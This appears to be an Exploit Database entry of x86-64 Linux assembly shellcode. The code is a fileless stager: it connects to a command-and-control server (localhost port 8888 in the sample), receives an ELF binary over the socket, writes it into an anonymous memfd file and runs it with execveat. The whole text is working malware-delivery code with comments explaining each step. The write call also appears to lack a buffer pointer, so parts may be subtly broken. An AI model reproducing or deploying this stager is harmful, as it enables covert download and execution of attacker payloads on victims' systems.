 Exploit Database
section .text
global _start

_start:
    ; Set up socket for further communication with C2
    ;
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    
    push 0x29
    pop  rax ; rax => 0x29 socket 
    cdq
    push 0x2 
    pop  rdi ; rdi => 2 = AF_INET
    push 0x1 
    pop  rsi ; rsi => 1 = SOCK_STREAM;
    ; xor rdx,rdx ; rdx = 0 do nothing
    syscall ; rax => sock_fd

    ; Connect to the C2 server
    ;
    ; int connect(int sockfd, {
    ;                 sa_family=AF_INET,
    ;                 sin_port=htons(8888),
    ;                 sin_addr=inet_addr("127.0.0.1")
    ;             }, 16);

    xchg rdi, rax ; swicth rdi and rax ; rdx => sock_fd ; rax=> 2
    mov  rcx, 0x0100007fb8220002 ; create a struct sockaddr * on stack
    push rcx
    mov  rsi, rsp ; rsi == rsp ==> sockaddr *
    push 0x10 
    pop  rdx ; rdx => 16
    push 0x2a 
    pop  rax ; syscall_no = rax = 0x2a => connect
    syscall ; rax => errno or success status of connect

    ; Read ELF length from socket
    ;
    ; read(unsigned int fd, char *buf, 8);


    pop  rcx; rcx => sockaddr * rsp
    push 0x8
    pop  rdx; rdx => 8
    push 0x0
    lea  rsi, [rsp] ; rsi => rsp 
    xor  rax, rax
    syscall

    ; Save length to r12 and socket descriptor to r13

    pop  r12
    push rdi
    pop  r13

    ; Create file descriptor for ELF file
    ;
    ; int memfd_create("", 0);

    xor  rax, rax
    push rax
    push rsp
    sub  rsp, 8
    mov  rdi, rsp
    push 0x13f
    pop  rax
    xor  rsi, rsi
    syscall

    ; Save file descriptor to r14

    push rax
    pop  r14

    ; Allocate memory space for ELF file
    ;
    ; void *mmap(NULL, size_t count,
    ;            PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

    push 0x9
    pop  rax
    xor  rdi, rdi
    push r12
    pop  rsi
    push 0x7
    pop  rdx
    xor  r9, r9
    push 0x22
    pop  r10
    syscall

    ; Save address to the allocated memory space to r15

    push rax
    pop  r15

    ; Read ELF file from socket
    ;
    ; recvfrom(int sockfd, void *buf, size_t count, MSG_WAITALL, NULL, 0);

    push 0x2d
    pop  rax
    push r13
    pop  rdi
    push r15
    pop  rsi
    push r12
    pop  rdx
    push 0x100
    pop  r10
    syscall

    ; Write read ELF file data to the file descriptor
    ;
    ; size_t write(unsigned int fd, const char *buf, size_t count);

    push 0x1
    pop  rax
    push r14
    pop  rdi
    push r12
    pop  rdx
    syscall

    ; Execute ELF from file descriptor
    ;
    ; int execveat(int dfd, const char *filename,
    ;              const char *const *argv,
    ;              const char *const *envp,
    ;              int flags);

    push 0x142
    pop  rax ; rax => 0x142 
    push r14
    pop  rdi; rdi == r14 => dfd
    push rsp
    sub  rsp, 8 ; rsp = rsp - 8 
    mov  rsi, rsp ; rsi => rsp saved filename 
    xor  r10, r10 ; r10 => 0  // no args
    xor  rdx, rdx ; rdx => 0  // no envp
    push 0x1000 
    pop  r8 ; flags = 0x1000 ==> AT_EMPTY_PATH   0x1000 /* Allow empty relative pathname */ 
    syscall
